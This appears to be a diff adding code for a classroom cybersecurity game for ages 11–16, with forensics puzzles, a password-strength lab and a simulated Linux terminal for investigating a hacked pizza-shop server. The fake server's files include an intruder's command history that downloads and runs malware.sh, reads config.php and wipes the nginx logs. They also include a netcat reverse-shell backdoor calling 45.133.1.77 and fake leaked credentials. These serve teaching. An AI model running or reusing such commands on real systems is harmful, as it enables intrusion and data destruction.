+    [{t:"02:16  Alarm: motion in Vault — DISABLED manually",flag:true,why:"Someone switched the alarm off from inside at the exact moment of the theft. That takes knowledge and access."}],
+    [{t:"08:00  Badge: M. Guide   Door: Main   ✓",flag:false,why:"The tour guide arriving for a normal day shift. Nothing odd."}]
+   ],
+   fact:"Logs are silent witnesses. Smart locks, Wi-Fi and cameras all keep timestamps, and timestamps are very hard for a culprit to argue with."},
+  {type:"spot", style:"log", title:"The Metadata Clue",
+   brief:"A staff member posted a selfie claiming they were “home all night.” Every photo secretly carries metadata. Tap what contradicts their story.",
+   lines:[
+    [{t:"File: selfie_latenight.jpg",flag:false,why:"Just the file name. It proves nothing on its own."}],
+    [{t:"Date taken: 02:11 (last night)",flag:true,why:"Taken at 2:11am, three minutes before the vault opened. Not exactly ‘asleep at home’."}],
+    [{t:"Camera: NightGuard-issue phone",flag:false,why:"Interesting context, but not proof by itself."}],
+    [{t:"GPS location: Harbourview Museum — Vault corridor",flag:true,why:"The photo’s own GPS places them inside the museum, not at home. The metadata caught the lie."}],
+    [{t:"Filter: Warm Glow",flag:false,why:"A photo filter. Irrelevant to the case."}]
+   ],
+   fact:"Metadata is “data about data”: hidden details like when and where a photo was taken. It’s solved real cases, and it’s why sharing raw photos can reveal your location."},
+  {type:"choice", title:"Name the Culprit",
+   brief:"The vault badge, the disabled alarm and the photo’s GPS all point one way. Your prime suspect was the night guard, R. Night. What do you conclude?",
+   options:[
+    {t:"Blame the tour guide; they just ‘seem dodgy’.",fb:"A hunch isn’t evidence. A good investigator follows proof, not vibes, even if a suspect is unpopular."},
+    {t:"The evidence consistently points to the night guard; recommend charges and hand over the full, untampered trail.",correct:true,fb:"The badge swipes, the manually disabled alarm and the photo’s own GPS all line up on the same person and time. That’s a solid, evidence-based case."},
+    {t:"Case closed the moment the alarm went off; no need to check the photo.",fb:"Stopping early is how the wrong person gets blamed. You confirm with independent evidence."},
+    {t:"Delete the photo so the suspect can’t argue.",fb:"Destroying evidence is a crime and ruins the case. Everything must be preserved."}
+   ],
+   fact:"Good forensics is about following evidence to the truth, wherever it leads, and being ready to clear an innocent suspect just as readily as to name a guilty one."}
+ ]
+}
+,
+{
+ id:"terminal", icon:"🐧", accent:"#5fd86a", tag:"THE COMMAND LINE", diff:"✦ ✦", time:"~40 min",
+ name:"Catch the Intruder", sub:"Use REAL Linux commands to investigate a hacked server",
+ role:"Incident Responder", badge:"Shell Master", terminal:true,
+ intro:"A web server has been broken into. You’ve been handed a terminal: a text-only way to control a computer that every hacker and defender uses. No mouse, no menus, you type a command and the machine answers. Work through the objectives on the right, learn the core commands (ls, cd, cat, grep, find), and uncover exactly what the intruder did. Stuck? Type  help  any time, or tap  hint.",
+ lessons:[
+  "The terminal controls a computer by typing commands: fast, precise and scriptable.",
+  "ls lists files · cd moves between folders · cat reads a file · pwd shows where you are.",
+  "Attackers hide files with a leading dot; ls -a reveals them.",
+  "grep searches INSIDE files, find searches FOR files, the two tools behind most investigations."
+ ],
+ discuss:"Why do professionals still use a text terminal instead of clicking icons? When is one typed command more powerful than any amount of clicking?",
+ objectives:[
+  {id:"ls",label:"List the files in your home folder",hint:"Type:  ls"},
+  {id:"lsa",label:"Reveal the attacker’s hidden files",hint:"Hidden files start with a dot. From your home folder type:  ls -a"},
+  {id:"cat",label:"Read the readme.txt briefing",hint:"Type:  cat readme.txt"},
+  {id:"cd",label:"Move into the logs folder",hint:"Type:  cd logs    (then  ls  to look around, and  cd ..  to go back)"},
+  {id:"grep",label:"Search the access log for the intruder’s IP 45.133.1.77",hint:"From inside logs:  grep 45.133.1.77 access.log"},
+  {id:"find",label:"Find the ransom note hidden somewhere on the server",hint:"Search the whole machine:  find / -name \"ransom*\""},
+  {id:"config",label:"Open the leaked config file to see what was stolen",hint:"It lives in the website folder:  cat ~/website/config.php"}
+ ],
+ fs:{type:"dir",children:{
+  home:{type:"dir",children:{agent:{type:"dir",children:{
+   "readme.txt":{type:"file",content:"=== INCIDENT RESPONSE: server breach ===\nSomeone got in overnight. Your job is to find out HOW and WHAT they took.\n\nHandy commands:\n  ls -a            reveal hidden files (attackers love to hide things)\n  grep TEXT FILE   search inside a file\n  find / -name X   hunt for a file anywhere on the machine\n\nFollow the objectives on the right. Good luck, agent."},
+   ".bash_history":{type:"file",content:"# the intruder's own command history - they forgot to clear it!\nwget http://45.133.1.77/malware.sh\nchmod +x malware.sh\n./malware.sh\ncat /home/agent/website/config.php\nrm -rf /var/log/nginx/*"},
+   ".backdoor.sh":{type:"file",content:"#!/bin/bash\n# hidden backdoor left by the attacker\nwhile true; do nc 45.133.1.77 4444 -e /bin/bash; sleep 60; done"},
+   logs:{type:"dir",children:{
+    "access.log":{type:"file",content:'203.0.113.9  [10/Nov:08:14] "GET /index.html" 200\n198.51.100.4 [10/Nov:08:15] "GET /menu.html" 200\n45.133.1.77  [10/Nov:02:03] "GET /admin" 401\n45.133.1.77  [10/Nov:02:04] "POST /admin/login" 401\n45.133.1.77  [10/Nov:02:04] "POST /admin/login" 200\n203.0.113.9  [10/Nov:09:02] "GET /contact.html" 200\n45.133.1.77  [10/Nov:02:06] "GET /website/config.php" 200'},
+    "auth.log":{type:"file",content:"Nov 10 02:03 sshd: Failed password for admin from 45.133.1.77\nNov 10 02:04 sshd: Failed password for admin from 45.133.1.77\nNov 10 02:04 sshd: Accepted password for admin from 45.133.1.77"}
+   }},
+   website:{type:"dir",children:{
+    "index.html":{type:"file",content:"<!DOCTYPE html>\n<h1>Pronto Pizza</h1>\n<p>Order online!</p>"},
+    "config.php":{type:"file",content:'<?php\n$db_host     = "localhost";\n$db_user     = "pronto_admin";\n$db_password = "Summer2024!";   // stored in plain text - this is what the attacker stole\n$api_key     = "pk_live_8842xk9920ffz";\n?>'}
+   }}
+  }}}},
+  tmp:{type:"dir",children:{
+   "ransom_note.txt":{type:"file",content:"YOUR FILES ARE ENCRYPTED.\nPay 2 BTC to wallet 1A2b3C4d... within 48 hours or they are gone.\n            - NightShade"}
+  }},
+  var:{type:"dir",children:{www:{type:"dir",children:{"placeholder":{type:"file",content:"(nothing here)"}}}}}
+ }}
+}
+];
+
+const app=document.getElementById('app');
+const $=s=>app.querySelector(s);
+let S={}, tw=null, best={};
+try{best=JSON.parse(localStorage.getItem('cyberskills-best')||'{}')}catch(e){best={}}
+function saveBest(id,p){if(!(best[id]>=p))best[id]=p;try{localStorage.setItem('cyberskills-best',JSON.stringify(best))}catch(e){}}
+const starsFor=p=>p>=85?3:p>=60?2:p>0?1:0;
+const starRow=n=>'★'.repeat(n)+'<i>'+'★'.repeat(3-n)+'</i>';
+function rankName(s){return s>=9?'Cyber Legend':s>=7?'Elite Investigator':s>=4?'Cyber Agent':s>=1?'Rookie':'Trainee'}
+function setAccent(c){document.documentElement.style.setProperty('--accent',c)}
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
+function toTop(){window.scrollTo({top:0})}
+
+function home(){
+ clearInterval(tw); setAccent('#8b6bff');
+ const total=MISSIONS.reduce((a,m)=>a+starsFor(best[m.id]||0),0);
+ app.innerHTML=`<header class="hero">
+  <div class="kicker mono">// SECURE CHANNEL OPEN</div>
+  <h1>CYBER<span>SKILLS</span></h1>
+  <p class="lead">Three hands-on challenges. Real techniques the professionals use, played safely.</p>
+  <div class="rank"><span class="mono">RANK</span><b>${rankName(total)}</b><span class="starsmall">${'★'.repeat(total)}${'☆'.repeat(9-total)}</span></div>
+ </header>
+ <div class="missions">${MISSIONS.map((m,k)=>`<button class="mcard" style="--accent:${m.accent}" data-k="${k}">
+   <div class="micon">${m.icon}</div>
+   <div class="mtxt"><div class="mnum mono">${m.tag} <span class="diff">${m.diff}</span> · ${m.time}</div><h2>${m.name}</h2><p>${m.sub}</p>
+   <div class="mmeta"><span>${m.role}</span><span class="st">${starRow(starsFor(best[m.id]||0))}</span></div></div></button>`).join('')}</div>
+ <details class="teach"><summary>For teachers</summary><ul>
+  <li><b>Ages 11–16</b> · 30–45 min each · phones, tablets and classroom whiteboards.</li>
+  <li><b>Play as a class:</b> project it and vote on each answer before revealing.</li>
+  <li>Every answer explains the <b>why</b>, and each challenge ends with key lessons and a discussion question.</li>
+  <li>The pizza and password challenges are framed as <b>ethical, permission-first</b> work: students learn the difference between a security professional and a criminal.</li>
+ </ul></details>`;
+ app.querySelectorAll('.mcard').forEach(b=>b.onclick=()=>briefing(+b.dataset.k));
+ toTop();
+}
+
+function briefing(k){
+ const m=MISSIONS[k]; S={m,k,i:0,scores:[]}; setAccent(m.accent);
+ app.innerHTML=`<button class="back" id="bk">← Back to start</button>
+ <div class="card">
+  <div class="mono kicker">INCOMING BRIEFING · CHALLENGE 0${k+1}</div>
+  <div class="bigicon">${m.icon}</div>
+  <h1 class="mt">${m.name}</h1><p class="subt">${m.sub}</p>
+  <div class="role"><span class="mono">YOUR ROLE</span><b>${m.role}</b></div>
+  <p class="typed" id="typed"></p>
+  <div class="objectives"><div class="mono">${m.terminal?'OBJECTIVES':'STAGES'}</div><ol>${(m.terminal?m.objectives.map(o=>o.label):m.stages.map(s=>s.title)).map(t=>`<li>${t}</li>`).join('')}</ol></div>
+  <button class="btn" id="go">${m.terminal?'Open the terminal →':'Start challenge →'}</button>
+ </div>`;
+ $('#bk').onclick=home;
+ const el=$('#typed'); let n=0; clearInterval(tw);
+ tw=setInterval(()=>{n+=2;el.textContent=m.intro.slice(0,n);if(n>=m.intro.length){clearInterval(tw);el.classList.add('done')}},16);
+ el.onclick=()=>{clearInterval(tw);el.textContent=m.intro;el.classList.add('done')};
+ $('#go').onclick=()=>{clearInterval(tw); m.terminal?terminalScreen():stage()};
+ toTop();
+}
+
+const xp=()=>S.scores.reduce((a,b)=>a+(b||0),0);
+const LABEL={spot:'INVESTIGATE',code:'READ THE CODE',choice:'MAKE THE CALL',sort:'PUT IT IN ORDER',plab:'EXPERIMENT'};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+function hl(raw){
+ // Escape first, then ONE left-to-right replace pass so inserted spans are never re-scanned.
+ return esc(raw).replace(
+  /(&lt;!--[\s\S]*?--&gt;)|(&quot;[\s\S]*?&quot;)|(&lt;\/?)([a-zA-Z0-9]+)|(\/?&gt;)|([a-zA-Z_][\w-]*)(?==)/g,
+  (m,com,str,open,tag,close,attr)=>{
+   if(com)return `<span class="c-com">${com}</span>`;
+   if(str)return `<span class="c-str">${str}</span>`;
+   if(open!==undefined)return `<span class="c-pun">${open}</span><span class="c-tag">${tag}</span>`;
+   if(close)return `<span class="c-pun">${close}</span>`;
+   if(attr)return `<span class="c-atr">${attr}</span>`;
+   return m;
+  });
+}
+function stage(){
+ const m=S.m, st=m.stages[S.i];
+ app.innerHTML=`<div class="hud"><button class="back" id="quit" aria-label="Quit">✕</button>
+  <div class="hudmid"><div class="mono hudname">${m.icon} ${m.name.toUpperCase()}</div>
+  <div class="dots">${m.stages.map((s,q)=>`<span class="dot ${q<S.i?'done':''} ${q===S.i?'cur':''}"></span>`).join('')}</div></div>
+  <div class="xp mono" id="xp">${xp()} XP</div></div>
+  <div class="card stage">
+   <div class="mono kicker">STAGE ${S.i+1}/${m.stages.length} · ${LABEL[st.type]}</div>
+   <h2>${st.title}</h2><p class="brieftxt">${st.brief}</p>
+   <div id="play"></div><div id="after"></div>
+  </div>`;
+ $('#quit').onclick=home;
+ R[st.type](st,$('#play'),finish);
+ toTop();
+}
+
+function finish(sc){
+ S.scores[S.i]=sc;
+ const x=$('#xp'); x.textContent=xp()+' XP'; x.classList.remove('pop'); void x.offsetWidth; x.classList.add('pop');
+ app.querySelectorAll('.dot')[S.i].classList.add('done');
+ const st=S.m.stages[S.i], last=S.i===S.m.stages.length-1;
+ const v=sc>=85?['Sharp work, investigator.','good']:sc>=50?['Solid. You’re getting it.','ok']:['Tricky one. Now you know.','bad'];
+ $('#after').innerHTML=`<div class="result ${v[1]}"><div class="pts mono">+${sc}<small>/100</small></div><div><b>${v[0]}</b></div></div>
+  <div class="fact"><span class="mono">⚡ DID YOU KNOW</span><p>${st.fact}</p></div>
+  <button class="btn" id="next">${last?'Challenge debrief →':'Next stage →'}</button>`;
+ $('#next').onclick=()=>{if(last)debrief();else{S.i++;stage()}};
+ setTimeout(()=>$('#after .result')?.scrollIntoView({behavior:'smooth',block:'center'}),250);
+}
+
+const R={
+ code(st,el,done){
+  const total=st.lines.filter(l=>l.flag).length; let found=0,wrong=0,over=false;
+  el.innerHTML=`<div class="spotbar mono"><span>FLAWS <b id="fc">0</b>/${total}</span><span>FALSE LEADS <b id="wc">0</b></span></div>
+   <div class="codewrap"><div class="codetop"><span class="dotrgb"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><span class="u">${esc(st.url||'view-source')}</span></div>
+   <div class="code" id="doc">${st.lines.map((l,i)=>`<div class="cl ${'flag'in l?'tap':''}" data-i="${i}"><span class="lno">${i+1}</span><span class="cc">${hl(l.code)}</span></div>`).join('')}</div></div>
+   <div class="log" id="log"></div>
+   <button class="btn ghost" id="fin">I’ve flagged them all</button>`;
+  const log=(c,h,t)=>el.querySelector('#log').insertAdjacentHTML('afterbegin',`<div class="note ${c}"><b>${h}</b> ${t}</div>`);
+  const end=()=>{if(over)return;over=true;el.querySelector('#fin').remove();
+   el.querySelectorAll('.cl').forEach(n=>{const l=st.lines[+n.dataset.i];if(l.flag&&!n.classList.contains('hit')){n.classList.add('missed');log('miss','Missed line '+(+n.dataset.i+1)+':',l.why)}});
+   done(Math.max(0,Math.round(found/total*100)-wrong*10))};
+  el.querySelectorAll('.cl.tap').forEach(n=>n.onclick=()=>{
+   if(over||n.classList.contains('hit')||n.classList.contains('miss'))return;
+   const l=st.lines[+n.dataset.i];
+   if(l.flag){n.classList.add('hit');found++;el.querySelector('#fc').textContent=found;log('good','Flaw found!',l.why);if(found===total)end()}
+   else{n.classList.add('miss');wrong++;el.querySelector('#wc').textContent=wrong;log('bad','False lead:',l.why);const d=el.querySelector('#doc');d.classList.remove('shake');void d.offsetWidth;d.classList.add('shake')}
+  });
+  el.querySelector('#fin').onclick=end;
+ },
+ choice(st,el,done){
+  el.innerHTML=`<div>${st.options.map((o,j)=>`<button class="opt" data-j="${j}"><span class="ok mono">${'ABCD'[j]}</span><span>${o.t}</span></button>`).join('')}</div><div id="fb"></div>`;
+  el.querySelectorAll('.opt').forEach(b=>b.onclick=()=>{
+   const o=st.options[+b.dataset.j], c=st.options.find(x=>x.correct);
+   el.querySelectorAll('.opt').forEach((x,q)=>{x.disabled=true;if(st.options[q].correct)x.classList.add('right')});
+   if(!o.correct)b.classList.add('wrong');
+   el.querySelector('#fb').innerHTML=o.correct?`<div class="note good"><b>Correct.</b> ${o.fb}</div>`:`<div class="note bad"><b>Not quite.</b> ${o.fb}</div><div class="note good"><b>Best answer:</b> ${c.fb}</div>`;
+   done(o.correct?100:0);
+  });
+ },
+ spot(st,el,done){
+  const segs=[];
+  const rows=st.lines.map((line,li)=>{
+   const cls=(li===0&&(st.style==='log'))?'head':'';
+   return `<div class="ln ${cls}">${line.map(p=>{if(typeof p==='string')return `<span class="lbl">${p}</span>`;segs.push(p);return `<span class="seg" data-s="${segs.length-1}">${p.t}</span>`}).join('')}</div>`}).join('');
+  const total=segs.filter(s=>s.flag).length; let found=0,wrong=0,over=false;
+  el.innerHTML=`<div class="spotbar mono"><span>CLUES <b id="fc">0</b>/${total}</span><span>FALSE LEADS <b id="wc">0</b></span></div>
+   <div class="doc doc-${st.style}" id="doc">${rows}</div>
+   <div class="log" id="log"></div>
+   <button class="btn ghost" id="fin">I’ve found them all</button>`;
+  const log=(c,h,t)=>el.querySelector('#log').insertAdjacentHTML('afterbegin',`<div class="note ${c}"><b>${h}</b> ${t}</div>`);
+  const end=()=>{if(over)return;over=true;el.querySelector('#fin').remove();
+   el.querySelectorAll('.seg').forEach(n=>{const s=segs[+n.dataset.s];if(s.flag&&!n.classList.contains('hit')){n.classList.add('missed');log('miss','Missed:',s.why)}});
+   done(Math.max(0,Math.round(found/total*100)-wrong*10))};
+  el.querySelectorAll('.seg').forEach(n=>n.onclick=()=>{
+   if(over||n.classList.contains('hit')||n.classList.contains('miss'))return;
+   const s=segs[+n.dataset.s];
+   if(s.flag){n.classList.add('hit');found++;el.querySelector('#fc').textContent=found;log('good','Clue found!',s.why);if(found===total)end()}
+   else{n.classList.add('miss');wrong++;el.querySelector('#wc').textContent=wrong;log('bad','False lead:',s.why);const d=el.querySelector('#doc');d.classList.remove('shake');void d.offsetWidth;d.classList.add('shake')}
+  });
+  el.querySelector('#fin').onclick=end;
+ },
+ sort(st,el,done){
+  const n=st.items.length; let order;
+  do{order=shuffle([...Array(n).keys()])}while(order.every((v,i)=>v===i));
+  let picked=[];
+  const draw=()=>{
+   el.innerHTML=`<div class="mono hint">${st.hint||'TAP IN ORDER. TAP A PLACED STEP TO UNDO.'}</div>
+    <div class="slots">${picked.map((ix,p)=>`<button class="slot filled" data-p="${p}"><span class="num">${p+1}</span><span>${st.items[ix].t}</span></button>`).join('')}${Array.from({length:n-picked.length},(_,q)=>`<div class="slot empty"><span class="num">${picked.length+q+1}</span></div>`).join('')}</div>
+    <div class="pool">${order.filter(ix=>!picked.includes(ix)).map(ix=>`<button class="chip" data-ix="${ix}">${st.items[ix].t}</button>`).join('')}</div>
+    ${picked.length===n?'<button class="btn" id="chk">Lock it in</button>':''}`;
+   el.querySelectorAll('.chip').forEach(b=>b.onclick=()=>{picked.push(+b.dataset.ix);draw()});
+   el.querySelectorAll('.slot.filled').forEach(b=>b.onclick=()=>{picked.splice(+b.dataset.p,1);draw()});
+   const c=el.querySelector('#chk'); if(c)c.onclick=check;
+  };
+  const check=()=>{
+   const ok=picked.filter((ix,p)=>ix===p).length;
+   el.innerHTML=`<div class="slots">${picked.map((ix,p)=>`<div class="slot ${ix===p?'ok':'no'}"><span class="num">${p+1}</span><span>${st.items[ix].t}</span></div>`).join('')}</div>
+    <div class="answer"><div class="mono">THE RIGHT ORDER</div><ol>${st.items.map(it=>`<li><b>${it.t}</b><span>${it.d}</span></li>`).join('')}</ol></div>`;
+   done(Math.round(ok/n*100));
+  };
+  draw();
+ },
+ plab(st,el,done){
+  let reached=false;
+  const common=new Set(['123456','password','123456789','qwerty','111111','abc123','password1','iloveyou','admin','letmein','monkey','dragon','football','liverpool','arsenal']);
+  const years=/(19|20)\d\d/;
+  el.innerHTML=`<div class="plab">
+    <label>TRY A PASSWORD (nothing leaves this page)</label>
+    <input class="pin" id="pw" type="text" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type here…">
+    <div class="pstat"><span class="t mono">ESTIMATED CRACK TIME</span><span class="big" id="time" style="color:var(--bad)">—</span></div>
+    <div class="pbar"><i id="bar" style="width:0"></i></div>
+    <div class="pwhy mono" id="why">A cracking tool tries the obvious stuff first…</div>
+    <div class="ptry">
+      <button data-v="123456">123456</button>
+      <button data-v="Liverpool1">Liverpool1</button>
+      <button data-v="P@ssw0rd!">P@ssw0rd!</button>
+      <button data-v="brave-kettle-orbit-lemon">brave-kettle-orbit-lemon</button>
+    </div>
+   </div>
+   <div class="goalbox" id="goal">🎯 <b>Goal:</b> ${st.goal}.</div>`;
+  const tiers=[
+   {n:'INSTANT',c:'#ff5470',w:6},{n:'SECONDS',c:'#ff7a45',w:16},{n:'MINUTES',c:'#ffa53d',w:30},
+   {n:'HOURS',c:'#ffc53d',w:44},{n:'DAYS',c:'#e5e23d',w:56},{n:'MONTHS',c:'#9fe03d',w:68},
+   {n:'YEARS',c:'#5fd86a',w:80},{n:'CENTURIES',c:'#3ddc84',w:92},{n:'LONGER THAN THE UNIVERSE',c:'#2de2c4',w:100}
+  ];
+  function score(p){
+   if(!p)return{i:-1,why:'A cracking tool tries the obvious stuff first…'};
+   const low=p.toLowerCase();
+   if(common.has(low))return{i:0,why:'This is on every attacker’s leaked-password list. Cracked instantly.'};
+   let pool=0;
+   if(/[a-z]/.test(p))pool+=26; if(/[A-Z]/.test(p))pool+=26; if(/[0-9]/.test(p))pool+=10; if(/[^a-zA-Z0-9]/.test(p))pool+=20;
+   let bits=p.length*Math.log2(pool||1);
+   let why='';
+   // penalties for predictable patterns
+   const words=p.split(/[^a-zA-Z]+/).filter(Boolean);
+   if(/^[a-zA-Z]+\d{0,4}[!._-]?$/.test(p)){bits-=14;why='Word + number + symbol is a pattern tools try early. ';}
+   if(years.test(p)){bits-=6;why+='Contains a year — easy to guess. ';}
+   // leetspeak normalisation
+   const deleet=low.replace(/4/g,'a').replace(/3/g,'e').replace(/0/g,'o').replace(/1/g,'i').replace(/\$/g,'s').replace(/@/g,'a');
+   if(deleet!==low && common.has(deleet.replace(/[!._-]+$/,''))){bits=10;why='Symbol swaps like $→s and 0→o are built into cracking tools. ';}
+   const sepWords=p.split(/[-_. ]/).filter(w=>w.length>2);
+   if(sepWords.length>=3){bits=Math.max(bits,sepWords.length*18+p.length);why='A passphrase of several random words — long and unpredictable. ';}
+   if(!why)why=p.length<10?'Short passwords fall fast, however odd they look. Add length! ':'Good length is doing the heavy lifting here. ';
+   let i=bits<28?0:bits<36?1:bits<44?2:bits<52?3:bits<60?4:bits<72?5:bits<90?6:bits<110?7:8;
+   return{i,why};
+  }
+  function render(){
+   const p=$('#pw').value, r=score(p), t=r.i<0?{n:'—',c:'var(--bad)',w:0}:tiers[r.i];
+   $('#time').textContent=t.n; $('#time').style.color=t.c;
+   $('#bar').style.width=t.w+'%'; $('#bar').style.background=t.c;
+   $('#why').textContent=r.why;
+   if(r.i>=7&&!reached){reached=true;const g=$('#goal');g.classList.add('hit');g.innerHTML='🎉 <b>Nailed it!</b> That would outlast civilisations. This is what a strong password looks like.';done(100);}
+  }
+  $('#pw').addEventListener('input',render);
+  el.querySelectorAll('.ptry button').forEach(b=>b.onclick=()=>{$('#pw').value=b.dataset.v;render();$('#pw').focus()});
+  // allow finishing even if they don't hit the top tier, after they've experimented
+  el.insertAdjacentHTML('beforeend','<button class="btn ghost" id="pdone">I’m done experimenting</button>');
+  $('#pdone').onclick=()=>{if(!reached){const best=score($('#pw').value).i;done(best>=7?100:best>=5?70:best>=3?45:20);}};
+ }
+};
+
+/* ============ LINUX TERMINAL ENGINE ============ */
+const HELP=['Available commands:',
+ '  ls [-a] [-l] [dir]    list files   (-a also shows hidden dotfiles)',
+ '  cd [dir]              change folder (cd .. up · cd ~ home · cd / root)',
+ '  pwd                   print the folder you are in',
+ '  cat [file]            show a file’s contents',
+ '  grep [text] [file]    search inside a file   (-i ignores case)',
+ '  find [dir] -name X    search for files by name  (X may use * )',
+ '  head / tail [-n N] f  first / last N lines of a file',
+ '  wc [-l] [file]        count lines (and words, characters)',
+ '  echo [text]           print text   ·   whoami   ·   clear   ·   hint'
+].join('\n');
+
+function terminalScreen(){
+ const m=S.m, ROOT=JSON.parse(JSON.stringify(m.fs));
+ let cwd=['home','agent'], hist=[], hidx=0, hintsUsed=0;
+ const obj={}; m.objectives.forEach(o=>obj[o.id]=false);
+ const doneCount=()=>m.objectives.filter(o=>obj[o.id]).length;
+
+ app.innerHTML=`<div class="hud"><button class="back" id="quit" aria-label="Quit">✕</button>
+   <div class="hudmid"><div class="mono hudname">🐧 ${m.name.toUpperCase()}</div>
+   <div class="dots"><span class="dot cur" style="flex:none;width:60px"></span></div></div>
+   <div class="xp mono" id="xp">0/${m.objectives.length}</div></div>
+   <div class="card stage">
+    <div class="mono kicker">THE COMMAND LINE · TYPE A COMMAND, PRESS ENTER</div>
+    <h2>${m.name}</h2>
+    <div class="objs" id="objs"><div class="mono"><span>OBJECTIVES</span><b id="oc">0/${m.objectives.length}</b></div>
+     ${m.objectives.map(o=>`<div class="obj" data-id="${o.id}"><span class="obx">○</span><span class="lbl">${o.label}</span></div>`).join('')}</div>
+    <div class="term" id="term">
+     <div class="termtop"><span class="dotrgb"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><span class="u mono">agent@server — bash</span></div>
+     <div class="termout" id="out"></div>
+     <div class="termline"><span class="pr mono" id="pr"></span><input class="cin" id="cin" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" placeholder="type a command…"></div>
+    </div>
+    <div class="chips" id="chips">
+     ${['help','ls','ls -a','cat readme.txt','cd logs','grep 45.133.1.77 access.log','cd ..','find / -name "ransom*"','cat ~/website/config.php','clear'].map(c=>`<button data-c="${c.replace(/"/g,'&quot;')}">${c}</button>`).join('')}
+     <button class="hintbtn" data-hint="1">💡 hint</button>
+    </div>
+   </div>`;
+ $('#quit').onclick=home;
+
+ const outEl=$('#out'), cin=$('#cin');
+ const dispPath=()=>{let p='/'+cwd.join('/');if(p==='/home/agent')return '~';if(p.startsWith('/home/agent/'))return '~'+p.slice(11);return p};
+ const promptStr=()=>`agent@server:${dispPath()}$`;
+ const setPrompt=()=>$('#pr').textContent=promptStr();
+ function print(html,cls){const d=document.createElement('div');d.className='ol '+(cls||'');d.innerHTML=html;outEl.appendChild(d);outEl.scrollTop=outEl.scrollHeight;}
+ const errl=t=>print(esc(t),'err');
+
+ const getNode=segs=>{let n=ROOT;for(const s of segs){if(n.type!=='dir'||!n.children[s])return null;n=n.children[s]}return n};
+ function resolve(arg){
+  if(arg===undefined||arg==='')arg='.';
+  arg=arg.replace(/^~(?=\/|$)/,'/home/agent');
+  let segs=arg[0]==='/'?[]:cwd.slice();
+  for(const part of arg.split('/')){if(part===''||part==='.')continue;if(part==='..'){segs.pop();continue}segs.push(part);}
+  const node=getNode(segs);return node?{node,segs}:null;
+ }
+ function tokenize(s){const re=/"([^"]*)"|'([^']*)'|(\S+)/g;let mm,o=[];while(mm=re.exec(s))o.push(mm[1]??mm[2]??mm[3]);return o;}
+ const rx=p=>new RegExp(p.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'));
+
+ function cmdLs(a){let all=false,long=false,p=[];a.forEach(x=>{if(x[0]==='-'){if(x.includes('a'))all=true;if(x.includes('l'))long=true;}else p.push(x);});
+  const r=resolve(p[0]||'.');if(!r)return errl('ls: cannot access '+(p[0]||'')+': No such file or directory');
+  if(r.node.type==='file')return print(esc(p[0]));
+  let names=Object.keys(r.node.children);if(!all)names=names.filter(n=>n[0]!=='.');names.sort();if(all)names=['.','..',...names];
+  if(!names.length)return;
+  const html=names.map(n=>{const nd=(n==='.'||n==='..')?{type:'dir'}:r.node.children[n];const cls=nd.type==='dir'?'d':(n.endsWith('.sh')?'x':'f');return `<span class="ls-${cls}">${esc(n)}${nd.type==='dir'?'/':''}</span>`;}).join(long?'\n':'   ');
+  print(html);
+ }
+ function cmdCd(a){const t=a[0]||'~';const r=resolve(t);if(!r)return errl('cd: '+t+': No such file or directory');if(r.node.type!=='dir')return errl('cd: '+t+': Not a directory');cwd=r.segs;setPrompt();}
+ function cmdCat(a){if(!a.length)return errl('usage: cat [file]');a.forEach(f=>{const r=resolve(f);if(!r)errl('cat: '+f+': No such file or directory');else if(r.node.type==='dir')errl('cat: '+f+': Is a directory');else print(esc(r.node.content));});}
+ function cmdGrep(a){let ci=false;const rest=a.filter(x=>{if(x==='-i'){ci=true;return false}return true});
+  if(rest.length<2)return errl('usage: grep [text] [file]');
+  const pat=rest[0],fileArg=rest.slice(1).join(' ');const r=resolve(fileArg);
+  if(!r)return errl('grep: '+fileArg+': No such file or directory');if(r.node.type!=='file')return errl('grep: '+fileArg+': Is a directory');
+  const flags=ci?'gi':'g',test=new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),ci?'i':'');
+  const hits=r.node.content.split('\n').filter(l=>test.test(l));
+  if(!hits.length)return;
+  const hx=new RegExp('('+esc(pat).replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')',flags);
+  print(hits.map(l=>esc(l).replace(hx,'<span class="hlmatch">$1</span>')).join('\n'));
+  return hits.length;
+ }
+ function cmdFind(a){let start='.',name=null;for(let i=0;i<a.length;i++){if(a[i]==='-name'){name=(a[++i]||'').replace(/^["']|["']$/g,'');}else if(a[i][0]!=='-'&&start==='.'&&i===0){start=a[i];}}
+  const r=resolve(start);if(!r)return errl('find: ‘'+start+'’: No such file or directory');
+  const g=name?new RegExp('^'+name.replace(/[.+^${}()|[\]\\]/g,'\\$&').replace(/\*/g,'.*').replace(/\?/g,'.')+'$'):null;
+  const found=[];(function walk(node,segs){const p='/'+segs.join('/');if(!g||g.test(segs[segs.length-1]||'/'))found.push(p==='/'+''?'/':p);if(node.type==='dir')for(const k of Object.keys(node.children))walk(node.children[k],[...segs,k]);})(r.node,r.segs);
+  if(!found.length)return;print(found.map(esc).join('\n'));return found.join('\n');
+ }
+ function cmdHT(a,tail){let n=10,rest=[];for(let i=0;i<a.length;i++){if(a[i]==='-n'){n=parseInt(a[++i])||10}else rest.push(a[i]);}const r=resolve(rest[0]);if(!r||r.node.type!=='file')return errl((tail?'tail: ':'head: ')+(rest[0]||'')+': No such file');let L=r.node.content.split('\n');print(esc((tail?L.slice(-n):L.slice(0,n)).join('\n')));}
+ function cmdWc(a){const lonly=a.includes('-l');const f=a.filter(x=>x[0]!=='-')[0];const r=resolve(f);if(!r||r.node.type!=='file')return errl('wc: '+(f||'')+': No such file');const c=r.node.content,li=c.split('\n').length;print(lonly?li+' '+f:li+' '+c.split(/\s+/).filter(Boolean).length+' '+c.length+' '+f);}
+
+ function check(cmd,a,grepHits,findOut){
